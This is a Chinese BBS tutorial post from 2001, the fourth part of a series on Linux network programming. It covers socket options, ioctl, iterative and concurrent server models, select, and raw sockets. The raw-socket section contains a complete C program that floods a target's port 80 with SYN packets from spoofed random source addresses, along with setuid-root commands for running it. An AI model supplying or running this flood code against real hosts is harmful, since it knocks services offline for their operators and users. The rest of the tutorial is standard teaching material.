 日月 光华   - -   Programming 精华区 文章 阅读 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -   发信人 :   freshbird   ( 真 菜鸟 ~ 快乐 的 愚人 ) ,   信 区 :   Programming 标     题 :   学习 Linux 网络 编程 ( 4 )   发信站 :   日月 光华 站   ( Mon   Apr     2   16 : 55 : 47   2001 )   ,   站 内 信件 8 .   套 接字 选项 有时候 我们 要 控制 套 接字 的 行为 ( 如 修改 缓冲区 的 大小 ) , 这个 时候 我们 就要 控制 套 接字 的 选项 了 . 8.1   getsockopt 和 setsockoptint   getsockopt ( int   sockfd , int   level , int   optname , void   * optval , socklen _ t   * optlen ) int   setsockopt ( int   sockfd , int   level , int   optname , const   void   * optval , socklen _ t   * optlen ) level 指定 控制 套 接字 的 层次 . 可以 取 三种 值 :   1 ) SOL _ SOCKET : 通用 套 接字 选项 .   2 ) IPPROTO _ IP : IP 选项 .   3 ) IPPROTO _ TCP : TCP 选项 . optname 指定 控制 的 方式 ( 选项 的 名称 ) , 我们 下面 详细 解释 optval 获得 或者 是 设置 套 接字 选项 . 根据 选项 名称 的 数据类型 进行 转换 选项 名称   说明   数据类型 = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = SOL _ SOCKET - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - SO _ BROADCAST   允许 发送 广播 数据   intSO _ DEBUG   允许 调试   intSO _ DONTROUTE   不 查找 路由   intSO _ ERROR   获得 套 接字 错误   intSO _ KEEPALIVE   保持 连接   intSO _ LINGER   延迟 关闭 连接   struct   lingerSO _ OOBINLINE   带外 数据 放入 正常 数据流   intSO _ RCVBUF   接收缓冲区 大小   intSO _ SNDBUF   发送缓冲区 大小   intSO _ RCVLOWAT   接收缓冲区 下限   intSO _ SNDLOWAT   发送缓冲区 下限   intSO _ RCVTIMEO   接收 超时   struct   timevalSO _ SNDTIMEO   发送 超时   struct   timevalSO _ REUSERADDR   允许 重用 本地 地址 和 端口   intSO _ TYPE   获得 套 接字 类型   intSO _ BSDCOMPAT   与 BSD 系统 兼容   int = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = IPPROTO _ IP - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - IP _ HDRINCL   在 数据包 中 包含 IP 首部   intIP _ OPTINOS   IP 首部 选项   intIP _ TOS   服务类型 IP _ TTL   生存 时间   int = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = IPPRO _ TCP - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - TCP _ MAXSEG   TCP 最大 数据 段 的 大小   intTCP _ NODELAY   不 使用 Nagle 算法   int = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = 关于 这些 选项 的 详细情况 请 查看   Linux   Programmers   Manual8 . 2   ioctlioctl 可以 控制 所有 的 文件 描述符 的 情况 , 这里 介绍 一下 控制 套 接字 的 选项 . int   ioctl ( int   fd , int   req , ... ) = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = ioctl 的 控制 选项 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - SIOCATMARK   是否 到达 带外 标记   intFIOASYNC   异步 输入 / 输出 标志   intFIONREAD   缓冲区 可读 的 字节数   int 详细 的 选项 请 用   man   ioctl _ list   查看 . 9 .   服务器 模型 学习 过 《 软件工程 》 吧 . 软件工程 可是 每 一个 程序员 " 必修 " 的 课程 啊 . 如果 你 没有 学习 过 ,   建议 你 去 看一看 .   在 这 一章 里面 , 我们 一 起来 从 软件工程 的 角度 学习 网络 编程 的 思想 . 在 我们 写 程序 之前 ,   我们 都 应该 从 软件工程 的 角度 规划 好 我们 的 软件 , 这样 我们 开发软件 的 效率 才 会 高 .   在 网络 程序 里面 , 一般 的 来说 都 是 许多 客户机 对应 一个 服务器 . 为了 处理 客户机 的 请求 ,   对 服务端 的 程序 就 提出 了 特殊 的 要求 . 我们 学习 一下 目前 最 常用 的 服务器 模型 . 循环 服务器 : 循环 服务器 在 同一个 时刻 只 可以 响应 一个 客户端 的 请求 并发 服务器 : 并发 服务器 在 同一个 时刻 可以 响应 多个 客户端 的 请求 9.1   循环 服务器 : UDP 服务器 UDP 循环 服务器 的 实现 非常简单 : UDP 服务器 每次 从套 接字 上 读取 一个 客户端 的 请求 , 处理 ,   然后 将 结果 返回 给 客户机 . 可以 用 下面 的 算法 来 实现 . socket ( ... ) ; bind ( ... ) ; while ( 1 ) { recvfrom ( ... ) ; process ( ... ) ; sendto ( ... ) ; } 因为 UDP 是非 面向 连接 的 , 没有 一个 客户端 可以 老是 占 住 服务端 .   只要 处理过程 不是 死循环 ,   服务器 对于 每 一个 客户机 的 请求 总是 能够 满足 . 9.2   循环 服务器 : TCP 服务器 TCP 循环 服务器 的 实现 也 不难 : TCP 服务器 接受 一个 客户端 的 连接 , 然后 处理 , 完成 了 这个 客户 的 所有 请求 后 , 断开连接 . 算法 如下 : socket ( ... ) ; bind ( ... ) ; listen ( ... ) ; while ( 1 ) { accept ( ... ) ; while ( 1 ) { read ( ... ) ; process ( ... ) ; write ( ... ) ; } close ( ... ) ; } TCP 循环 服务器 一次 只能 处理 一个 客户端 的 请求 . 只有 在 这个 客户 的 所有 请求 都 满足 后 , 服务器 才 可以 继续 后面 的 请求 . 这样 如果 有 一个 客户端 占 住 服务器 不放时 , 其它 的 客户机 都 不能 工作 了 . 因此 , TCP 服务器 一般 很少 用 循环 服务器 模型 的 . 9.3   并发 服务器 : TCP 服务器 为了 弥补 循环 TCP 服务器 的 缺陷 , 人们 又 想 出 了 并发 服务器 的 模型 .   并发 服务器 的 思想 是 每 一个 客户机 的 请求 并 不由 服务器 直接 处理 , 而是 服务器 创建 一个   子 进程 来 处理 . 算法 如下 : socket ( ... ) ; bind ( ... ) ; listen ( ... ) ; while ( 1 ) { accept ( ... ) ; if ( fork ( .. ) = = 0 ) { while ( 1 ) { read ( ... ) ; process ( ... ) ; write ( ... ) ; } close ( ... ) ; exit ( ... ) ; } close ( ... ) ; } TCP 并发 服务器 可以 解决 TCP 循环 服务器 客户机 独占 服务器 的 情况 .   不过 也 同时 带来 了 一个 不小 的 问题 . 为了 响应 客户机 的 请求 , 服务器 要 创建 子 进程 来 处理 .   而 创建 子 进程 是 一种 非常 消耗 资源 的 操作 . 9.4   并发 服务器 : 多路复用 I / O 为了 解决 创建 子 进程 带来 的 系统资源 消耗 , 人们 又 想 出 了 多路复用 I / O 模型 . 首先 介绍 一个 函数 selectint   select ( int   nfds , fd _ set   * readfds , fd _ set   * writefds , fd _ set   * except   fds , struct   timeval   * timeout ) void   FD _ SET ( int   fd , fd _ set   * fdset ) void   FD _ CLR ( int   fd , fd _ set   * fdset ) void   FD _ ZERO ( fd _ set   * fdset ) int   FD _ ISSET ( int   fd , fd _ set   * fdset ) 一般 的 来说 当 我们 在 向 文件 读写 时 , 进程 有 可能 在 读写 出 阻塞 , 直到 一定 的 条件 满足 .   比如 我们 从 一个套 接字 读数据 时 , 可能 缓冲区 里面 没有 数据 可 读 ( 通信 的 对方 还 没有   发送数据 过来 ) , 这个 时候 我们 的 读 调用 就 会 等待 ( 阻塞 ) 直到 有 数据 可读 . 如果 我们 不   希望 阻塞 , 我们 的 一个 选择 是 用 select 系统 调用 .   只要 我们 设置 好 select 的 各个 参数 , 那么 当 文件 可以 读写 的 时候 select 回 " 通知 " 我们   说 可以 读写 了 .   readfds 所有 要读 的 文件 文件 描述符 的 集合 writefds 所有 要 的 写 文件 文件 描述符 的 集合 exceptfds 其他 的 服要 向 我们 通知 的 文件 描述符 timeout 超时 设置 . nfds 所有 我们 监控 的 文件 描述符 中 最大 的 那 一个 加 1 在 我们 调用 select 时 进程 会 一直 阻塞 直到 以下 的 一种 情况 发生 .   1 ) 有 文件 可以 读 . 2 ) 有 文件 可以 写 . 3 ) 超时 所 设置 的 时间 到 . 为了 设置 文件 描述符 我们 要 使用 几个 宏 .   FD _ SET 将 fd 加入 到 fdsetFD _ CLR 将 fd 从 fdset 里面 清除 FD _ ZERO 从 fdset 中 清除 所有 的 文件 描述符 FD _ ISSET 判断 fd 是否 在 fdset 集合 中 使用 select 的 一个 例子 int   use _ select ( int   * readfd , int   n ) { fd _ set   my _ readfd ; int   maxfd ; int   i ; maxfd = readfd [ 0 ] ; for ( i = 1 ; i   if ( readfd [ i ] > maxfd )   maxfd = readfd [ i ] ; while ( 1 ) { / *   将 所有 的 文件 描述符 加入   * / FD _ ZERO ( & my _ readfd ) ; for ( i = 0 ; i   FD _ SET ( readfd [ i ] , * my _ readfd ) ; / *   进程 阻塞   * / select ( maxfd + 1 , &   my _ readfd , NULL , NULL , NULL ) ; / *   有 东西 可以 读 了   * / for ( i = 0 ; i   if ( FD _ ISSET ( readfd [ i ] , & my _ readfd ) ) { / *   原来 是 我 可以 读 了   * / we _ read ( readfd [ i ] ) ; } } } 使用 select 后 我们 的 服务器程序 就 变成 了 . 初始 话 ( socket , bind , listen ) ; while ( 1 ) { 设置 监听 读写 文件 描述符 ( FD _ * ) ; 调用 select ; 如果 是 倾听 套 接字 就绪 , 说明 一个 新 的 连接 请求 建立 { 建立 连接 ( accept ) ; 加入 到 监听 文件 描述符 中 去 ; } 否则 说明 是 一个 已经 连接 过 的 描述符 { 进行 操作 ( read 或者 write ) ; } } 多路复用 I / O 可以 解决 资源 限制 的 问题 . 着 模型 实际上 是 将 UDP 循环 模型 用 在 了 TCP 上面 . 这 也 就 带来 了 一些 问题 . 如 由于 服务器 依次 处理 客户 的 请求 , 所以 可能 会 导致 有 的 客户   会 等待 很久 . 9.5   并发 服务器 : UDP 服务器 人们 把 并发 的 概念 用于 UDP 就 得到 了 并发 UDP 服务器 模型 .   并发 UDP 服务器 模型 其实 是 简单 的 . 和 并发 的 TCP 服务器 模型 一样 是 创建 一个 子 进程 来 处理 的   算法 和 并发 的 TCP 模型 一样 . 除非 服务器 在 处理 客户端 的 请求 所用 的 时间 比较 长 以外 , 人们 实际上 很少 用 这种 模型 . 9.6   一个 并发 TCP 服务器 实例 # include # include # include # include # include # define   MY _ PORT   8888int   main ( int   argc   , char   * * argv ) { int   listen _ fd , accept _ fd ; struct   sockaddr _ in   client _ addr ; int   n ; if ( ( listen _ fd = socket ( AF _ INET , SOCK _ STREAM , 0 ) ) < 0 ) { printf ( " Socket   Error : % s \ n \ a " , strerror ( errno ) ) ; exit ( 1 ) ; } bzero ( & client _ addr , sizeof ( struct   sockaddr _ in ) ) ; client _ addr . sin _ family = AF _ INET ; client _ addr . sin _ port = htons ( MY _ PORT ) ; client _ addr . sin _ addr . s _ addr = htonl ( INADDR _ ANY ) ; n = 1 ; / *   如果 服务器 终止 后 , 服务器 可以 第二次 快速 启动 而 不用 等待 一段时间   * / setsockopt ( listen _ fd , SOL _ SOCKET , SO _ REUSEADDR , & n , sizeof ( int ) ) ; if ( bind ( listen _ fd , ( struct   sockaddr   * ) & client _ addr , sizeof ( client _ addr ) ) < 0 ) { printf ( " Bind   Error : % s \ n \ a " , strerror ( errno ) ) ; exit ( 1 ) ; } listen ( listen _ fd , 5 ) ; while ( 1 ) { accept _ fd = accept ( listen _ fd , NULL , NULL ) ; if ( ( accept _ fd < 0 ) && ( errno = = EINTR ) ) continue ; else   if ( accept _ fd < 0 ) { printf ( " Accept   Error : % s \ n \ a " , strerror ( errno ) ) ; continue ; } if ( ( n = fork ( ) ) = = 0 ) { / *   子 进程 处理 客户端 的 连接   * / char   buffer [ 1024 ] ; close ( listen _ fd ) ; n = read ( accept _ fd , buffer , 1024 ) ; write ( accept _ fd , buffer , n ) ; close ( accept _ fd ) ; exit ( 0 ) ; } else   if ( n < 0 ) printf ( " Fork   Error : % s \ n \ a " , strerror ( errno ) ) ; close ( accept _ fd ) ; } } 你 可以 用 我们 前面 写 客户端程序 来 调试 着 程序 , 或者 是 用来 telnet 调试 10 .   原始 套 接字 我们 在 前面 已经 学习 过 了 网络 程序 的 两种 套 接字 ( SOCK _ STREAM , SOCK _ DRAGM ) . 在 这 一章 里面 我们 一 起来 学习 另外 一种 套 接字 - - 原始 套 接字 ( SOCK _ RAW ) .   应用 原始 套 接字 , 我们 可以 编写出 由 TCP 和 UDP 套 接字 不 能够 实现 的 功能 .   注意 原始 套 接字 只 能够 由 有 root 权限 的 人 创建 . 10.1   原始 套 接字 的 创建 int   sockfd ( AF _ INET , SOCK _ RAW , protocol ) 可以 创建 一个 原始 套 接字 . 根据 协议 的 类型 不同 我们 可以 创建 不同 类型 的 原始 套 接字   比如 : IPPROTO _ ICMP , IPPROTO _ TCP , IPPROTO _ UDP 等等 . 详细 的 情况 查看   下面 我们 以 一个 实例 来 说明 原始 套 接字 的 创建 和 使用 10.2   一个 原始 套 接字 的 实例 还 记得 DOS 是 什么 意思 吗 ? 在 这里 我们 就 一 起来 编写 一个 实现 DOS 的 小 程序 .   下面 是 程序 的 源代码 / * * * * * * * * * * * * * * * * * * * *   DOS . c   * * * * * * * * * * * * * * * * * / # include # include # include # include # include # include # include # include # include # define   DESTPORT   80   / *   要 攻击 的 端口 ( WEB )   * / # define   LOCALPORT   8888void   send _ tcp ( int   sockfd , struct   sockaddr _ in   * addr ) ; unsigned   short   check _ sum ( unsigned   short   * addr , int   len ) ; int   main ( int   argc , char   * * argv ) { int   sockfd ; struct   sockaddr _ in   addr ; struct   hostent   * host ; int   on = 1 ; if ( argc ! = 2 ) { fprintf ( stderr , " Usage : % s   hostname \ n \ a " , argv [ 0 ] ) ; exit ( 1 ) ; } bzero ( & addr , sizeof ( struct   sockaddr _ in ) ) ; addr . sin _ family = AF _ INET ; addr . sin _ port = htons ( DESTPORT ) ; if ( inet _ aton ( argv [ 1 ] , & addr . sin _ addr ) = = 0 ) { host = gethostbyname ( argv [ 1 ] ) ; if ( host = = NULL ) { fprintf ( stderr , " HostName   Error : % s \ n \ a " , hstrerror ( h _ errno ) ) ; exit ( 1 ) ; } addr . sin _ addr = * ( struct   in _ addr   * ) ( host - > h _ addr _ list [ 0 ] ) ; } / * * * *   使用 IPPROTO _ TCP 创建 一个 TCP 的 原始 套 接字   * * * * / sockfd = socket ( AF _ INET , SOCK _ RAW , IPPROTO _ TCP ) ; if ( sockfd < 0 ) { fprintf ( stderr , " Socket   Error : % s \ n \ a " , strerror ( errno ) ) ; exit ( 1 ) ; } / * * * * * * * *   设置 IP 数据包 格式 , 告诉 系统 内核模块 IP 数据包 由 我们 自己 来 填写   * * * / setsockopt ( sockfd , IPPROTO _ IP , IP _ HDRINCL , & on , sizeof ( on ) ) ; / * * * *   没有 办法 , 只用 超级 护 用户 才 可以 使用 原始 套 接字   * * * * * * * * * / setuid ( getpid ( ) ) ; / * * * * * * * * *   发送 炸弹 了 ! ! ! !   * * * * / send _ tcp ( sockfd , & addr ) ; } / * * * * * * *   发送 炸弹 的 实现   * * * * * * * * * / void   send _ tcp ( int   sockfd , struct   sockaddr _ in   * addr ) { char   buffer [ 100 ] ;   / * * * *   用来 放置 我们 的 数据包   * * * * / struct   ip   * ip ; struct   tcphdr   * tcp ; int   head _ len ; / * * * * * * *   我们 的 数据包 实际上 没有 任何 内容 , 所以 长度 就是 两个 结构 的 长度   * * * / head _ len = sizeof ( struct   ip ) + sizeof ( struct   tcphdr ) ; bzero ( buffer , 100 ) ; / * * * * * * * *   填充 IP 数据包 的 头部 , 还 记得 IP 的 头 格式 吗 ?   * * * * * * / ip = ( struct   ip   * ) buffer ; ip - > ip _ v = IPVERSION ;   / * *   版本 一般 的 是   4   * * / ip - > ip _ hl = sizeof ( struct   ip ) > > 2 ;   / * *   IP 数据包 的 头部 长度   * * / ip - > ip _ tos = 0 ;   / * *   服务类型   * * / ip - > ip _ len = htons ( head _ len ) ;   / * *   IP 数据包 的 长度   * * / ip - > ip _ id = 0 ;   / * *   让 系统 去 填写 吧   * * / ip - > ip _ off = 0 ;   / * *   和 上面 一样 , 省 点 时间   * * / ip - > ip _ ttl = MAXTTL ;   / * *   最长 的 时间   255   * * / ip - > ip _ p = IPPROTO _ TCP ;   / * *   我们 要发 的 是   TCP 包   * * / ip - > ip _ sum = 0 ;   / * *   校验 和 让 系统 去 做   * * / ip - > ip _ dst = addr - > sin _ addr ;   / * *   我们 攻击 的 对象   * * / / * * * * * * *   开始 填写 TCP 数据包   * * * * * / tcp = ( struct   tcphdr   * ) ( buffer   + sizeof ( struct   ip ) ) ; tcp - > source = htons ( LOCALPORT ) ; tcp - > dest = addr - > sin _ port ;   / * *   目的 端口   * * / tcp - > seq = random ( ) ; tcp - > ack _ seq = 0 ; tcp - > doff = 5 ; tcp - > syn = 1 ;   / * *   我要 建立 连接   * * / tcp - > check = 0 ; / * *   好 了 , 一切 都 准备 好 了 . 服务器 , 你 准备 好 了 没有 ? ?   ^ _ ^   * * / while ( 1 ) { / * *   你 不 知道 我 是从 那里 来 的 , 慢慢 的 去 等 吧 !   * * / ip - > ip _ src . s _ addr = random ( ) ; / * *   什么 都 让 系统 做 了 , 也 没有 多大 的 意思 , 还是 让 我们 自己 来 校验 头部 吧   * / / * *   下面 这 条 可有可无   * / tcp - > check = check _ sum ( ( unsigned   short   * ) tcp , sizeof ( struct   tcphdr ) ) ; sendto ( sockfd , buffer , head _ len , 0 , addr , sizeof ( struct   sockaddr _ in ) ) ; } } / *   下面 是 首部 校验 和 的 算法 , 偷 了 别人 的   * / unsigned   short   check _ sum ( unsigned   short   * addr , int   len ) { register   int   nleft = len ; register   int   sum = 0 ; register   short   * w = addr ; short   answer = 0 ; while ( nleft > 1 ) { sum + = * w ++ ; nleft - = 2 ; } if ( nleft = = 1 ) { * ( unsigned   char   * ) ( & answer ) = * ( unsigned   char   * ) w ; sum + = answer ; } sum = ( sum > > 16 ) + ( sum & 0xffff ) ; sum + = ( sum > > 16 ) ; answer = ~ sum ; return ( answer ) ; } 编译 一下 , 拿 localhost 做 一下 实验 , 看看 有 什么 结果 . ( 千万 不要 试 别人 的 啊 ) .   为了 让 普通用户 可以 运行 这个 程序 , 我们 应该 将 这个 程序 的 所有者 变为 root , 且   设置 setuid 位 [ root @ hoyt   / root ] # chown   root   DOS [ root @ hoyt   / root ] # chmod   + s   DOS10 . 3   总结 原始 套 接字 和 一般 的 套 接字 不同 的 是 以前 许多 由 系统 做 的 事情 , 现在 要 由 我们 自己 来 做 了 .   不过 这 里面 是不是 有 很多 的 乐趣 呢 .   当 我们 创建 了 一个 TCP 套 接字 的 时候 , 我们 只是 负责 把 我们 要 发送 的 内容 ( buffer ) 传递 给 了 系统 .   系统 在 收到 我们 的 数据 后 , 回 自动 的 调用 相应 的 模块 给 数据 加上 TCP 头部 , 然后 加上 IP 头部 .   再 发送 出去 . 而 现在 是 我们 自己 创建 各个 的 头部 , 系统 只是 把 它们 发送 出去 .   在 上面 的 实例 中 , 由于 我们 要 修改 我们 的 源 IP地址 , 所以 我们 使用 了 setsockopt 函数 , 如果 我们 只是 修改 TCP 数据 , 那么 IP 数据 一样 也 可以 由 系统 来 创建 的 . 11 .   后记 总算 完成 了 网络 编程 这个 教程 . 算 起来 我 差不多 写 了 一个 星期 , 原来 以为 写 这个 应该 是 一件   不难 的 事 , 做 起来 才 知道 原来 有 很多 的 地方 都 比 我 想象 的 要 难 . 我 还 把 很多 的 东西 都 省略 掉 了   不过 写 完 了 这篇 教程 以后 , 我 好象 对 网络 的 认识 又 增加 了 一步 . 如果 我们 只是 编写 一般 的   网络 程序 还是 比较 容易 的 , 但是 如果 我们 想 写出 比较 好 的 网络 程序 我们 还有 着 遥远 的 路 要 走 .   网络 程序 一般 的 来说 都 是 多 进程 加上 多线程 的 . 为了 处理 好 他们 内部 的 关系 , 我们 还要 学习   进程 之间 的 通信 . 在 网络 程序 里面 有着 许许多多 的 突发事件 , 为此 我们 还要 去 学习 更 高级 的   事件处理 知识 . 现在 的 信息 越来越 多 了 , 为了 处理 好 这些 信息 , 我们 还要 去 学习 数据库 .   如果 要 编写出 有用 的 黑客软件 , 我们 还要 去 熟悉 各种 网络协议 . 总之 我们 要学 的 东西 还 很多很多 . 看一看 外国 的 软件 水平 , 看一看 印度 的 软件 水平 , 宝岛 台湾 的 水平 , 再 看一看 我们 自己 的 软件 水平 大家 就 会 知道 了 什么 叫做 差距 . 我们 现在 用 的 软件 有 几个 是 我们 中国 人 自己 编写 的 . 不过 大家 不要 害怕 , 不用 担心 . 只要 我们 还是 清醒 的 , 还 能够 认清 我们 和 别人 的 差距 ,   我们 就 还有 希望 .   毕竟 我们 现在 还 年轻 . 只要 我们 努力 , 认真 的 去 学习 , 我们 一定 能够 学好 的 . 我们 就 可以 追 上 别人 直到 超过 别人 ! 相信 一点 : 别人 可以 做到 的 我们 一样 可以 做到 , 而且 可以 比 别人 做 的 更好 ! 勇敢 的 freshbird 和 你 的 mm , 为了 我们 伟大祖国 的 软件产业 , 为了 祖国 的 未来 , 努力 的 去 奋斗 吧 ! 祖国 会 记住 你们 的 !   - - ※   来源 : · 日月 光华 站   bbs . fudan . edu . cn · [ FROM :   202.119 . 32.102 ]   - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [ 返回 上 一页 ]   [ 本 讨论区 ]